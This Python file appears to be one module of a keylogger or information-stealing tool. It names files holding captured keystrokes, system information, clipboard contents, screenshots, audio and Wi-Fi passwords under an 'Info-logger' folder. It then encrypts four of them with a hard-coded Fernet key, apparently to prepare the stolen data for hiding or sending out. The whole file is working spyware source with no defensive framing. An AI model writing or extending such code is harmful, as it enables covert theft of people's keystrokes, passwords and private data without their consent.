from cryptography.fernet import Fernet
import time

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
wifi_password = "wifi_password.txt"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
wifi_password_e = 'e_wifi_password.txt'

key = "aOzWpqVAq2D1XEAZS4mLSC3ygwEjOs8cbJlhEnkpcDo=" 

file_path = "C:\Info-logger\Logged_information" 
extend = "\\"
file_merge = file_path + extend

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information, file_merge + wifi_password]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e, file_merge + wifi_password_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    count += 1